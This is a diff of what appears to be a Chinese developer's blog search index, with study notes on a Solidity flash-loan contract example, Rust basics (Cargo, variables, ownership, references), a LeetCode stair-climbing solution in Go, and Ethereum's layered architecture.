-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20FlashMint.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Lender is ERC20, Ownable ,ERC20FlashMint &#123;</span><br><span class="line"></span><br><span class="line">    bytes32 private constant _RETURN_VALUE = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    constructor() ERC20(&quot;Lender&quot;, &quot;LND&quot;) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        IERC3156FlashBorrower borrower,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) public virtual override returns (bool) &#123;</span><br><span class="line">        require(amount &lt;= maxFlashLoan(token), &quot;ERC20FlashMint: amount exceeds maxFlashLoan&quot;);</span><br><span class="line">        uint256 fee = flashFee(token, amount);</span><br><span class="line">        _mint(address(borrower), amount);</span><br><span class="line">        require(</span><br><span class="line">            borrower.onFlashLoan(address(borrower), token, amount, fee, data) == _RETURN_VALUE,</span><br><span class="line">            &quot;ERC20FlashMint: invalid return value&quot;</span><br><span class="line">        );</span><br><span class="line">     </span><br><span class="line">        uint256 currentAllowance = allowance(address(this),address(borrower));</span><br><span class="line">        require(currentAllowance &gt;= amount + fee, &quot;ERC20FlashMint: allowance does not allow refund&quot;);</span><br><span class="line">        _approve(address(this),address(borrower) , currentAllowance - amount - fee);</span><br><span class="line">        // 是否需要烧掉根据实际情况需求而定</span><br><span class="line">        ///_burn(address(receiver), amount + fee);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //贷款方或银行经理approve</span><br><span class="line">    function approveLoanAmount(address borrower ,uint256 amount) public virtual onlyOwner  &#123;</span><br><span class="line">        _approve(address(this),borrower , amount);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Borrower is IERC3156FlashBorrower &#123;</span><br><span class="line">    enum Action &#123;NORMAL, OTHER&#125;</span><br><span class="line">    IERC3156FlashLender lender;</span><br><span class="line">    constructor (address _lenderAddress) &#123;</span><br><span class="line">        lender = IERC3156FlashLender(_lenderAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev ERC-3156 Flash loan callback</span><br><span class="line">    function onFlashLoan(</span><br><span class="line">        address initiator,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        uint256 fee,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns(bytes32) &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == address(lender),</span><br><span class="line">            &quot;FlashBorrower: Untrusted lender&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            initiator == address(this),</span><br><span class="line">            &quot;FlashBorrower: Untrusted loan initiator&quot;</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        (Action action) = abi.decode(data, (Action));</span><br><span class="line">        console.log(&quot;action&quot;);</span><br><span class="line">        </span><br><span class="line">        if (action == Action.NORMAL) &#123;</span><br><span class="line">            // do one thing</span><br><span class="line">            console.log(&quot;Action.NORMAL&quot;);</span><br><span class="line">        &#125; else if (action == Action.OTHER) &#123;</span><br><span class="line">            console.log(&quot;Action.OTHER&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /// @dev Initiate a flash loa</span><br><span class="line">    function flashBorrow(</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        bytes memory data = abi.encode(Action.NORMAL);</span><br><span class="line">        uint256 _allowance = IERC20(token).allowance(address(lender),address(this));</span><br><span class="line">       </span><br><span class="line">        uint256 _fee = lender.flashFee(token, amount);</span><br><span class="line">        uint256 _repayment = amount + _fee;</span><br><span class="line">        console.log(&quot;_allowance&quot;,_allowance,&quot;_repayment&quot;,_repayment);</span><br><span class="line">        require(_allowance &gt;= _repayment, &quot;ERC20FlashMint: allowance does not allow refund&quot;);</span><br><span class="line">        lender.flashLoan(this, token, amount, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function encodeNORMAL() public pure returns(bytes memory message)&#123;</span><br><span class="line">        return abi.encode(Action.NORMAL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>ETH</tag>
-        <tag>Etherjs</tag>
       </tags>
   </entry>
   <entry>
@@ -1665,6 +1548,147 @@ eth.getTransaction(xxx)
       </tags>
   </entry>
   <entry>
+    <title>rust</title>
+    <url>/2021/04/27/5-0rust/</url>
+    <content><![CDATA[<h1 id="1-mac安装"><a href="#1-mac安装" class="headerlink" title="1.mac安装"></a>1.mac安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install ca-certificates</span><br><span class="line">brew install rust</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-hello-world"><a href="#2-hello-world" class="headerlink" title="2.hello world"></a>2.hello world</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main()&#123;</span><br><span class="line">    println!(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustc hello.rs</span><br><span class="line">./hello</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Cargo"><a href="#Cargo" class="headerlink" title="Cargo"></a>Cargo</h1><ul>
+<li><p>Cargo是Rust的构建系统和包管理工具</p>
+<ul>
+<li>构建代码 下载依赖库 构建这些库</li>
+</ul>
+</li>
+<li><p>证明是否被安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro Demo % cargo version</span><br><span class="line">cargo 1.59.0</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用cargo创建项目</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo new hello_cargo</span><br></pre></td></tr></table></figure>
+<p>生成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">darren@darrendeMacBook-Pro hello_cargo % tree   </span><br><span class="line">.</span><br><span class="line">├── Cargo.toml</span><br><span class="line">└── src</span><br><span class="line">    └── main.rs</span><br><span class="line"></span><br><span class="line">1 directory, 2 files</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Cargo.toml文件</li>
+</ul>
+<p>配置包 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[package]</span><br><span class="line">name = &quot;hello_cargo&quot;</span><br><span class="line">version = &quot;0.1.0&quot;</span><br><span class="line">edition = &quot;2021&quot;</span><br><span class="line"></span><br><span class="line"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span><br><span class="line"></span><br><span class="line">[dependencies]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>edition 版本</p>
+<p>在代码的包叫crate</p>
+<h2 id="构建cargo项目"><a href="#构建cargo项目" class="headerlink" title="构建cargo项目"></a>构建cargo项目</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo build </span><br></pre></td></tr></table></figure>
+
+<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo run xx</span><br></pre></td></tr></table></figure>
+<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo check </span><br></pre></td></tr></table></figure>
+<p>cargo check 比 cargo build 快的多</p>
+<h2 id="为发布构建"><a href="#为发布构建" class="headerlink" title="为发布构建"></a>为发布构建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo build --release </span><br></pre></td></tr></table></figure>
+<p>编译进行优化，发布使用</p>
+<h1 id="2-1-猜数游戏"><a href="#2-1-猜数游戏" class="headerlink" title="2.1 猜数游戏"></a>2.1 猜数游戏</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use std::io;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;猜数&quot;);</span><br><span class="line">    println!(&quot;猜测一个数 &quot;);</span><br><span class="line">   </span><br><span class="line">    // let foo =1;</span><br><span class="line">    // let bar =foo ; // immutable   默认不可以变</span><br><span class="line">    // foo =2 语法错误</span><br><span class="line">     </span><br><span class="line">    // 生成字符串</span><br><span class="line">    // new() 创建实例的</span><br><span class="line">    let mut guess =String::new();</span><br><span class="line">    // 输入 </span><br><span class="line">    // io::stdin()=&gt; Stdin</span><br><span class="line">    //read_line 将输入放到guess字符串中  &amp;mut可以变化的字符串,按引用传递</span><br><span class="line">    //rust核心竞争力就是安全的使用引用</span><br><span class="line">    io::stdin().read_line(&amp;mut guess).expect(&quot;无法读取行&quot;);</span><br><span class="line">    // Io:Result Ok,Err </span><br><span class="line">    //如果不使用 expect，就可以看到rust安全性</span><br><span class="line"></span><br><span class="line">    // &#123;&#125; 对应变量值</span><br><span class="line">    println!(&quot;您猜测的数是,&#123;&#125;&quot;,guess)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="2-2生成神秘的数字"><a href="#2-2生成神秘的数字" class="headerlink" title="2.2生成神秘的数字"></a>2.2生成神秘的数字</h1><p>rust的库  <a class="link"   href="https://crates.io/crates/rand" >https://crates.io/crates/rand<i class="fas fa-external-link-alt"></i></a></p>
+<p>guessing_game&#x2F;Cargo.toml<br>追加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">rand=&quot;0.3.14&quot;</span><br></pre></td></tr></table></figure>
+
+<p>cargo.lock 首次build的出现的</p>
+<p>如果修改某个库的版本 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo update</span><br></pre></td></tr></table></figure>
+<p>可以进行升级。</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use std::io;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use rand::Rng;  // trait </span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;猜数!!&quot;);</span><br><span class="line">    // 随机数生成器  包括1 不包括101</span><br><span class="line">    let secret_number = rand::thread_rng().gen_range(1, 101);</span><br><span class="line"></span><br><span class="line">    println!(&quot;神秘数字是&#123;&#125;&quot;,secret_number);</span><br><span class="line">    println!(&quot;猜测一个数 &quot;);</span><br><span class="line">   </span><br><span class="line">    // let foo =1;</span><br><span class="line">    // let bar =foo ; // immutable   默认不可以变</span><br><span class="line">    // foo =2 语法错误</span><br><span class="line">     </span><br><span class="line">    // 生成字符串</span><br><span class="line">    // new() 创建实例的</span><br><span class="line">    let mut guess =String::new();</span><br><span class="line">    // 输入 </span><br><span class="line">    // io::stdin()=&gt; Stdin</span><br><span class="line">    //read_line 将输入放到guess字符串中  &amp;mut可以变化的字符串,按引用传递</span><br><span class="line">    //rust核心竞争力就是安全的使用引用</span><br><span class="line">    io::stdin().read_line(&amp;mut guess).expect(&quot;无法读取行&quot;);</span><br><span class="line">    // Io:Result Ok,Err </span><br><span class="line">    //如果不使用 expect，就可以看到rust安全性</span><br><span class="line"></span><br><span class="line">    // &#123;&#125; 对应变量值</span><br><span class="line">    println!(&quot;您猜测的数是,&#123;&#125;&quot;,guess)</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="2-3比较数字"><a href="#2-3比较数字" class="headerlink" title="2.3比较数字"></a>2.3比较数字</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use std::&#123;io, cmp::Ordering&#125;;</span><br><span class="line">use rand::Rng;  // trait </span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;猜数!!&quot;);</span><br><span class="line">    let secret_number = rand::thread_rng().gen_range(1, 101);  // i32 u32 i64</span><br><span class="line">    println!(&quot;神秘数字是&#123;&#125;&quot;,secret_number);</span><br><span class="line">    println!(&quot;猜测一个数 &quot;);</span><br><span class="line">    let mut guess =String::new();</span><br><span class="line">  </span><br><span class="line">    io::stdin().read_line(&amp;mut guess).expect(&quot;无法读取行&quot;);</span><br><span class="line">   </span><br><span class="line">    // 转化为数字 </span><br><span class="line">    let guess:u32= guess.trim().parse().expect(&quot;please type a number&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    println!(&quot;您猜测的数是,&#123;&#125;&quot;,guess);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    match guess.cmp(&amp;secret_number)&#123;      // guess 是字符串</span><br><span class="line">        Ordering::Less =&gt; println!(&quot;Too small&quot;),</span><br><span class="line">        Ordering::Greater =&gt; println!(&quot;Too big&quot;),</span><br><span class="line">        Ordering::Equal =&gt; println!(&quot;you win&quot;),</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="3-1变量与可变性"><a href="#3-1变量与可变性" class="headerlink" title="3.1变量与可变性"></a>3.1变量与可变性</h1><p><code>cargo new variables</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const MAX_POINT:u32= 100_000;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;Hello, world!&quot;);</span><br><span class="line"></span><br><span class="line">    let mut  x= 6;</span><br><span class="line"></span><br><span class="line">    println!(&quot;the value  of x is   &#123;&#125;&quot;,x);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    x=5 ;</span><br><span class="line">    println!(&quot;the value  of x is   &#123;&#125;&quot;,x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>const与不可变量</p>
+<h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"> </span><br><span class="line">    let   x= 6;</span><br><span class="line">    let x = x+1;</span><br><span class="line">    let x = x*3;</span><br><span class="line"></span><br><span class="line">    println!(&quot;the value  of x is   &#123;&#125;&quot;,x);</span><br><span class="line"></span><br><span class="line">    let space=&quot;   &quot;;</span><br><span class="line">    let space=space.len();</span><br><span class="line">    println!(&quot;&#123;&#125;&quot;,space)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"> /*</span><br><span class="line">  u32 就是没有符号32位 </span><br><span class="line"></span><br><span class="line">  isize usize  与计算机的位数有关</span><br><span class="line">  整数字面值  </span><br><span class="line">  Decimal  98_222</span><br><span class="line">  Byte  b&#x27;A&#x27;</span><br><span class="line"></span><br><span class="line">  整数的默认类型i32 </span><br><span class="line"></span><br><span class="line">  整数的溢出</span><br><span class="line">  u8  0~255</span><br><span class="line"></span><br><span class="line">  浮点类型 </span><br><span class="line">  f32 32位 单精度</span><br><span class="line">  f64 64位 双精度</span><br><span class="line"></span><br><span class="line">  布尔类型</span><br><span class="line"></span><br><span class="line">  true false 一个字节的空间</span><br><span class="line"></span><br><span class="line">  符合类型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> */</span><br><span class="line">    // let guess: u32 = &quot;42&quot;.parse().expect(&quot;not a number&quot;);</span><br><span class="line">    // println!(&quot;&#123;&#125;&quot;, guess) ;</span><br><span class="line"></span><br><span class="line">    // let tup: (i32, f64, u8) = (500, 6.4, 1);</span><br><span class="line">    // let (x, y, z) = tup;</span><br><span class="line"></span><br><span class="line">    // println!(&quot;&#123;&#125;&quot;,tup.0);</span><br><span class="line"></span><br><span class="line">    // println!(&quot;&#123;&#125;&quot;,x);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // let months = [&quot;January&quot;, &quot;February&quot;, &quot;March&quot;, &quot;April&quot;, &quot;May&quot;, &quot;June&quot;, &quot;July&quot;,</span><br><span class="line">    //           &quot;August&quot;, &quot;September&quot;, &quot;October&quot;, &quot;November&quot;, &quot;December&quot;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 声明数组 </span><br><span class="line"></span><br><span class="line">    // let a: [i32; 5] = [1, 2, 3, 4, 5];</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    println!(&quot;Hello, world!&quot;);</span><br><span class="line">    // another_function(5); // argument</span><br><span class="line">    </span><br><span class="line">    let x= five(6);</span><br><span class="line">    println!(&quot;&#123;&#125;&quot;,x);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn five(x:i32) -&gt; i32&#123;</span><br><span class="line">    5+x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// fn another_function()&#123;</span><br><span class="line">//     println!(&quot;another function&quot;);</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">fn another_function(x: i32)&#123;  // parameter </span><br><span class="line">    println!(&quot;  x  is &#123;&#125;&quot;,x );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="所有权"><a href="#所有权" class="headerlink" title="所有权"></a>所有权</h1><h2 id="stack-amp-amp-heap"><a href="#stack-amp-amp-heap" class="headerlink" title="stack &amp;&amp; heap"></a>stack &amp;&amp; heap</h2><p>在很多语言中，你并不需要经常考虑到栈与堆。不过在像 Rust 这样的系统编程语言中，值是位于栈上还是堆上在更大程度上影响了语言的行为以及为何必须做出这样的抉择。我们会在本章的稍后部分描述所有权与栈和堆相关的内容，所以这里只是一个用来预热的简要解释。</p>
+<p>栈和堆都是代码在运行时可供使用的内存，但是它们的结构不同。栈以放入值的顺序存储值并以相反顺序取出值。这也被称作 后进先出（last in, first out）。想象一下一叠盘子：当增加更多盘子时，把它们放在盘子堆的顶部，当需要盘子时，也从顶部拿走。不能从中间也不能从底部增加或拿走盘子！增加数据叫做 进栈（pushing onto the stack），而移出数据叫做 出栈（popping off the stack）。栈中的所有数据都必须占用已知且固定的大小。在编译时大小未知或大小可能变化的数据，要改为存储在堆上。 堆是缺乏组织的：当向堆放入数据时，你要请求一定大小的空间。内存分配器（memory allocator）在堆的某处找到一块足够大的空位，把它标记为已使用，并返回一个表示该位置地址的 指针（pointer）。这个过程称作 在堆上分配内存（allocating on the heap），有时简称为 “分配”（allocating）。将数据推入栈中并不被认为是分配。因为指针的大小是已知并且固定的，你可以将指针存储在栈上，不过当需要实际数据时，必须访问指针。想象一下去餐馆就座吃饭。当进入时，你说明有几个人，餐馆员工会找到一个够大的空桌子并领你们过去。如果有人来迟了，他们也可以通过询问来找到你们坐在哪。</p>
+<p>入栈比在堆上分配内存要快，因为（入栈时）分配器无需为存储新数据去搜索内存空间；其位置总是在栈顶。相比之下，在堆上分配内存则需要更多的工作，这是因为分配器必须首先找到一块足够存放数据的内存空间，并接着做一些记录为下一次分配做准备。</p>
+<p>访问堆上的数据比访问栈上的数据慢，因为必须通过指针来访问。现代处理器在内存中跳转越少就越快（缓存）。继续类比，假设有一个服务员在餐厅里处理多个桌子的点菜。在一个桌子报完所有菜后再移动到下一个桌子是最有效率的。从桌子 A 听一个菜，接着桌子 B 听一个菜，然后再桌子 A，然后再桌子 B 这样的流程会更加缓慢。出于同样原因，处理器在处理的数据彼此较近的时候（比如在栈上）比较远的时候（比如可能在堆上）能更好的工作。在堆上分配大量的空间也可能消耗时间。</p>
+<p>当你的代码调用一个函数时，传递给函数的值（包括可能指向堆上数据的指针）和函数的局部变量被压入栈中。当函数结束时，这些值被移出栈。</p>
+<p>跟踪哪部分代码正在使用堆上的哪些数据，最大限度的减少堆上的重复数据的数量，以及清理堆上不再使用的数据确保不会耗尽空间，这些问题正是所有权系统要处理的。一旦理解了所有权，你就不需要经常考虑栈和堆了，不过明白了所有权的主要目的就是为了管理堆数据，能够帮助解释为什么所有权要以这种方式工作。</p>
+<h1 id="所有权与函数"><a href="#所有权与函数" class="headerlink" title="所有权与函数"></a>所有权与函数</h1><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s= String::from(&quot;Hello&quot;);</span><br><span class="line">    let len = calculate_length(&amp;s);</span><br><span class="line"></span><br><span class="line">    println!(&quot;  the length of &#123;&#125;  is &#123;&#125;&quot;,s,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn calculate_length(s: &amp;String) -&gt; usize&#123;</span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&amp; 符号就是引用，允许你引用一些值 </p>
+<p>不可以修改借用的东西</p>
+<h2 id="可变引用"><a href="#可变引用" class="headerlink" title="可变引用"></a>可变引用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s= String::from(&quot;Hello&quot;);</span><br><span class="line">    let len = calculate_length(&amp;mut s);</span><br><span class="line"></span><br><span class="line">    println!(&quot;  the length of &#123;&#125;  is &#123;&#125;&quot;,s,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn calculate_length(s: &amp;mut String) -&gt; usize&#123;</span><br><span class="line">    s.push_str(&quot;,world&quot;);</span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>只能有一个可变引用</p>
+<ul>
+<li>防止数据竞争。</li>
+</ul>
+</li>
+<li><p>三种行为会发生数据竞争</p>
+<ul>
+<li>两个或者多个指针同时访问同一个数据。</li>
+<li>至少有一个指针用于写入数据。</li>
+<li>没有任何机制来同步对数据的访问。</li>
+</ul>
+</li>
+<li><p>另外一个限制</p>
+<ul>
+<li>不可以同时拥有一个可变引用和一个不变的引用</li>
+<li>多个不变的引用是可以的。</li>
+</ul>
+</li>
+</ul>
+<h2 id="悬空引用"><a href="#悬空引用" class="headerlink" title="悬空引用"></a>悬空引用</h2><p>dangling pointer :一个指针引用内存中的某个地址，而这块内存已经释放并且分配给其他人使用了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let r =dangle()</span><br><span class="line">&#125;</span><br><span class="line">fn dangle() -&gt; &amp;String&#123;</span><br><span class="line">    let s =String::from(&quot;hello&quot;);</span><br><span class="line">    &amp;s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">error[E0106]: missing lifetime specifier</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-3切片"><a href="#4-3切片" class="headerlink" title="4.3切片"></a>4.3切片</h1><p>提供一种不持有所有权的数据类型：切片（slice）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">     let mut s =String::from(&quot;hello world&quot;);</span><br><span class="line">     let wordIndex = first_world(&amp;s );</span><br><span class="line">     s.clear();</span><br><span class="line">     println!(&quot;  &#123;&#125;&quot;, wordIndex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn first_world(s: &amp;String) -&gt;usize&#123;</span><br><span class="line">    let bytes =s.as_bytes();</span><br><span class="line">    for (i ,&amp;item) in bytes.iter().enumerate()&#123;</span><br><span class="line">        if item == b&#x27; &#x27;&#123;</span><br><span class="line">            return i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>Rust</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>7-0Algorithm.md</title>
+    <url>/2020/06/01/7-0Algorithm-md/</url>
+    <content><![CDATA[<h1 id="爬楼梯"><a href="#爬楼梯" class="headerlink" title="爬楼梯"></a>爬楼梯</h1><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。</p>
+<p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
+<p> </p>
+<p>示例 1：</p>
+<p>输入：n &#x3D; 2<br>输出：2<br>解释：有两种方法可以爬到楼顶。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 1 阶 + 1 阶</span><br><span class="line">2. 2 阶</span><br></pre></td></tr></table></figure>
+
+<p>示例 2：</p>
+<p>输入：n &#x3D; 3<br>输出：3<br>解释：有三种方法可以爬到楼顶。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 1 阶 + 1 阶 + 1 阶</span><br><span class="line">2. 1 阶 + 2 阶</span><br><span class="line">3. 2 阶 + 1 阶</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>来源：力扣（LeetCode）</p>
+</blockquote>
+<p>这种方法的时间复杂度是很高的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func climbStairs(n int) int &#123;</span><br><span class="line">    if n==1 &#123;return 1;&#125;</span><br><span class="line">    if n==2 &#123;return 2;&#125;</span><br><span class="line"></span><br><span class="line">    return climbStairs(n-1) + climbStairs(n-2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+  </entry>
+  <entry>
     <title>NFT_masterclass</title>
     <url>/2022/02/19/NFT-masterclass/</url>
     <content><![CDATA[<h1 id="NFT"><a href="#NFT" class="headerlink" title="NFT"></a>NFT</h1><ul>
@@ -1690,6 +1714,25 @@ eth.getTransaction(xxx)
 ]]></content>
   </entry>
   <entry>
+    <title>ETH</title>
+    <url>/2022/03/07/ETH/</url>
+    <content><![CDATA[<figure class="highlight graph"><figcaption><span>LR</span></figcaption><table><tr><td class="code"><pre><span class="line">应用层--&gt;合约层</span><br><span class="line">合约层--&gt;激励层</span><br><span class="line">激励层--&gt;共识层</span><br><span class="line">共识层--&gt;网络层</span><br><span class="line">网络层--&gt;数据层</span><br></pre></td></tr></table></figure>
+
+<h5 id="分层信息"><a href="#分层信息" class="headerlink" title="分层信息"></a>分层信息</h5><ul>
+<li>数据层 存储以太坊区块链的所有数据 本质是数据库</li>
+<li>网络层 ：P2P网络 在以太坊网络层使用KAD</li>
+<li>共识层：规定通过何种方式实现交易记录的过程 </li>
+<li>激励层： 以太坊采用POW(与比特币的pow不同)实现挖矿奖励机制</li>
+<li>合约层： 平台层 通过合约层开发任意的Dapp 实现完整的区块链系统 在以太坊中 就是evm 和智能合约 </li>
+<li>应用：以太坊的最上层 ，主要使用truffle  web3.js</li>
+</ul>
+<p><img src="/images/web3/eth.png" alt="image"></p>
+]]></content>
+      <tags>
+        <tag>ETH</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Oracle</title>
     <url>/2022/04/10/Oracle/</url>
     <content><![CDATA[<p><img src="/images/web3/oracle.png" alt="image"></p>
@@ -1700,15 +1743,6 @@ eth.getTransaction(xxx)
       <tags>
         <tag>ETH</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Yield_Farming_On_Compound</title>
-    <url>/2022/04/10/Yield-Farming-On-Compound/</url>
-    <content><![CDATA[<p><img src="/images/web3/c1.png" alt="image"></p>
-<p><img src="/images/web3/c2.png" alt="image"></p>
-<p><img src="/images/web3/c3.png" alt="image"></p>
-<p><img src="/images/web3/c4.png" alt="image"></p>
-]]></content>
   </entry>
   <entry>
     <title>套利</title>
@@ -1883,25 +1917,6 @@ eth.getTransaction(xxx)
 ]]></content>
   </entry>
   <entry>
-    <title>ETH</title>
-    <url>/2022/03/07/ETH/</url>
-    <content><![CDATA[<figure class="highlight graph"><figcaption><span>LR</span></figcaption><table><tr><td class="code"><pre><span class="line">应用层--&gt;合约层</span><br><span class="line">合约层--&gt;激励层</span><br><span class="line">激励层--&gt;共识层</span><br><span class="line">共识层--&gt;网络层</span><br><span class="line">网络层--&gt;数据层</span><br></pre></td></tr></table></figure>
-
-<h5 id="分层信息"><a href="#分层信息" class="headerlink" title="分层信息"></a>分层信息</h5><ul>
